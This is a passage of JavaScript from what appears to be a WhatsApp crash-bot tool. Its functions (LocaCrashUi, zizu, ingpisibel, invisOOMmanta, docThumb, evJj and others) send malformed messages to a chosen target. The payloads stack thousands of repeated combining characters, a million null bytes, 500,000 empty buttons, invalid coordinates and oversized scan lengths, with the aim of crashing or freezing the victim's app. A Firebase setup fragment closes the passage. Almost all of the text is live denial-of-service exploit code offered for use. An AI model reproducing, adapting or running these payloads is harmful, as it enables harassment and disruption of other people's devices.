                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
                contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    isQuestion: true,
                    isGroupStatus: true
                }
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `§OtaxUdang§\n${"𑜦".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "ꦽ".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: false
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: cards
                        }),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () =>
                                        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        },
        { userJid: target }
    );

    await otax.relayMessage(target, carousel.message, {
        messageId: carousel.key.id,
        participant: { jid: target }
    });

    const otaxx = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 388944,
                            height: 1600,
                            width: 1200,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
                        }
                    },
                    body: {
                        text: "ꦾ".repeat(10000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    "icon": "RIVIEW",
                                    "flow_cta": "ꦾ".repeat(10000),
                                    "flow_message_version": "3"
                                })
                            },
                        ]
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, proto.Message.fromObject(otaxx), { userJid: target });
    await otax.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
}
async function LocaCrashUi(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    const otaxx = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: -999.03499999999999,
                            degreesLongitude: 922.9999999999999,
                            name: "DO YOU KNOW ME?¿ OTAX" + "ꦽ".repeat(60000),
                            url: "https://t.me/Otapengenkawin",
                            contextInfo: {
                                externalAdReply: {
                                    quotedAd: {
                                        advertiserName: "ꦾ".repeat(60000),
                                        mediaType: "IMAGE",
                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                        caption: "οταϰ ιѕ нєяє"
                                    },
                                    placeholderKey: {
                                        remoteJid: "0@g.us",
                                        fromMe: true,
                                        id: "ABCDEF1234567890"
                                    }
                                }
                            }
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "нαιι ιм οταϰ⸙"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{[",
                        messageVersion: 3,
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    "icon": "RIVIEW",
                                    "flow_cta": "ꦽ".repeat(10000),
                                    "flow_message_version": "3"
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    "icon": "RIVIEW",
                                    "flow_cta": "ꦾ".repeat(10000),
                                    "flow_message_version": "3"
                                })
                            },
                        ]
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, proto.Message.fromObject(otaxx), { userJid: target });
    await otax.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
}
async function oombimg(otax, target) {
    const msg = generateWAMessageFromContent("status@broadcast", {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
            fileLength: 388944,
            height: 1600,
            width: 1200,
            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1776937541",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
            contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
            },
            caption: "MantaXxx",
            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
            scanLengths: [
                2899999999999999077,
                1799999999999998555,
                7699999999999999148,
                1069999999999999164
            ],
            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
        }
    }, {});

    await otax.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: []
                            }
                        ]
                    }
                ]
            }
        ]
    })
}

async function zizu(otax, target) {
    const quotedOpts = typeof m !== "undefined" && m ? { quoted: m } : {};

    const msg = generateWAMessageFromContent("status@broadcast", {
        interactiveMessage: {
            header: {
                title: "\0".repeat(1000000),
                hasMediaAttachment: false
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "inapp_signup",
                        buttonParamsJson: "{}"
                    }
                ]
            },
            body: {
                text: "MantaXxx"
            }
        }
    }, quotedOpts);

    return await otax.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target]
    });
}
async function iozk(otax, target) {
    for (let z = 0; z < 1; z++) {
        await otax.relayMessage(target, {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
                        submessages: [],
                        unifiedResponse: {
                            data: Buffer.from(JSON.stringify({
                                response_id: crypto.randomUUID(),
                                sections: [
                                    {
                                        view_model: {
                                            primitive: {
                                                text: "MantaXxx",
                                                inline_entities: ["𑇂𑆵𑆴𑆿".repeat(60000)],
                                                __typename: "GenAIMarkdownTextUXPrimitive",
                                            },
                                            __typename: "GenAISingleLayoutViewModel",
                                        }
                                    }
                                ]
                            }))
                        },
                        contextInfo: {
                            forwardingScore: 1,
                            isForwarded: true,
                            forwardOrigin: 4
                        }
                    }
                }
            }
        }, {
            participant: { jid: target }
        })
        await sleep(1000);
    }
}
async function ingpisibel(otax, target) {
    for (let z = 0; z < 1; z++) {
        await otax.relayMessage("status@broadcast", {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "MantaXxx"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        }, {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{
                            tag: "to",
                            attrs: { jid: target }
                        }]
                    }]
                }
            ]
        });
    }
}
async function invisOOMmanta(otax, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
                            fileLength: "93217",
                            caption: "7eppsynC",
                            height: 1080,
                            width: 1080,
                            mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
                            fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
                            directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1778142659",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
                            contextInfo: {
                                pairedMediaType: "NOT_PAIRED_MEDIA",
                                isQuestion: true,
                                isGroupStatus: true
                            },
                            scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                            scanLengths: [
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999
                            ],
                            midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
                        },
                        title: "MantaXxx",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "\0"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };
    await otax.relayMessage(target, msg, {
        participant: { jid: target }
    })
}
async function docThumb(otax, target, gs = false, array = true) {
    const docs = {
        documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
            mimetype: "application/pdf",
            fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
            fileLength: "72028",
            pageCount: 1,
            mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
            fileName: "MantaX.pdf",
            fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
            directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1779839963",
            thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
            thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
            thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
            jpegThumbnail: "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",
            contextInfo: {},
            thumbnailHeight: 480,
            thumbnailWidth: 480
        }
    };

    const msg = {
        interactiveMessage: {
            header: {
                hasMediaAttachment: true,
                documentMessage: docs.documentMessage
            },
            body: {
                text: "MantaXxx"
            },
            nativeFlowMessage: {
                buttons: array ? Array.from({ length: 500000 }, () => ({})) : "[".repeat(500000)
            }
        }
    }

    await otax.relayMessage(target, gs ? {
        groupStatusMessageV2: {
            message: msg
        }
    } : msg, {
        participant: { jid: target }
    })
}
async function evJj(otax, target) {
    const msg = await otax.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: crypto.randomBytes(32),
                    },
                    eventMessage: {
                        isCanceled: false,
                        name: "🩸 @manta | null ",
                        description:
                            "\"Anjing\", kalimat yang terlintas \nSaat fokus hancurnya hidupku\nMulai kuhujam cara yang sama\nAmpunan langkah sebuah siksa 🫀\".",
                        location: {
                            degreesLatitude: "a",
                            degreesLongitude: "a",
                            name: "X",
                        },
                        joinLink:
                            "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ",
                        startTime: 1714957200,
                        isScheduleCall: false,
                        hasReminder: true,
                        thumbnailDirectPath: "https://aloneatlast.xyz/thumb.jpg",
                        thumbnailSha256: Buffer.from("1234567890abcdef", "hex"),
                        thumbnailEncSha256: Buffer.from("abcdef1234567890", "hex"),
                        mediaKey: Buffer.from(
                            "abcdef1234567890abcdef1234567890",
                            "hex"
                        ),
                        mediaKeyTimestamp: Date.now(),
                        contextInfo: {
                            remoteJid: "status@broadcast",
                            participant: "0@s.whatsapp.net",
                            fromMe: false,
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: {
                                        text: "🦠",
                                        format: "EXTENSIONS_1",
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "address_message",
                                        paramsJson: `{"values":{"in_pin_code":"999999","building_name":"atzcore","landmark_area":"X","address":"tamainfinity","tower_number":"dvx","city":"markzuckerberg","name":"caywz","phone_number":"999999999999","house_number":"dvx","floor_number":"dvx","state":"X${"\u0000".repeat(
                                            100000
                                        )}"}}`,
                                        version: 3,
                                    },
                                },
                            },
                        },
                    },
                },
            },
        },
        {
            ephemeralExpiration: 5,
            timeStamp: Date.now(),
        }
    );

    await new Promise((r) => setTimeout(r, 1000));

    await otax.relayMessage(target, {
        protocolMessage: {
            type: 14,
            key: msg,
            editedMessage: {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32)
                        },
                        eventMessage: {
                            isCanceled: true,
                            name: "🩸 @manta | null ",
                            description: "\"Anjing\", kalimat yang terlintas \nSaat fokus hancurnya hidupku\nMulai kuhujam cara yang sama\nAmpunan langkah sebuah siksa 🫀\".",
                            location: {
                                degreesLatitude: 0,
                                degreesLongitude: 0,
                                name: "X"
                            },
                            joinLink: "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ" + "\0".repeat(100000),
                            startTime: 1714957200,
                            hasReminder: false,
                            isScheduleCall: true,
                            thumbnailDirectPath: "/thumb.jpg",
                            thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
                            thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
                            mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
                            mediaKeyTimestamp: Date.now(),
                            contextInfo: {
                                remoteJid: "status@broadcast",
                                participant: "0@s.whatsapp.net",
                                fromMe: false
                            }
                        }
                    }
                }
            }
        }
    }, {
        ephemeralExpiration: 5,
        timeStamp: Date.now()
    })
}


let admin = null;
let messaging = null;

try {
    const serviceAccountPath = path.join(__dirname, 'serviceAccountKey.json');
    if (!fs.existsSync(serviceAccountPath)) {
        console.log('[FIREBASE] ⚠️  serviceAccountKey.json tidak ditemukan. Firebase dinonaktifkan.');
    } else {
        const serviceAccount = JSON.parse(fs.readFileSync(serviceAccountPath, 'utf8'));
        // Cek apakah credential valid (bukan file kosong atau dummy)
        if (!serviceAccount.private_key || !serviceAccount.client_email || !serviceAccount.project_id) {
            console.log('[FIREBASE] ⚠️  serviceAccountKey.json tidak lengkap. Firebase dinonaktifkan.');
        } else {
            admin = require('firebase-admin');
            admin.initializeApp({
                credential: admin.credential.cert(serviceAccount),
                databaseURL: 'https://mantax-e0919-default-rtdb.asia-southeast1.firebasedatabase.app/'
            });
            messaging = admin.messaging();
            console.log('[FIREBASE] ✅ Firebase Admin SDK initialized successfully.');
        }
    }
    setInterval(async () => {
        if (!admin) return;
        try {
            const db = admin.database();
            const ref = db.ref('devices');
            const snapshot = await ref.once('value');
            if (!snapshot.exists()) return;

            const devices = snapshot.val();
            const now = Date.now();
            let deletedCount = 0;

            for (const [deviceId, data] of Object.entries(devices)) {
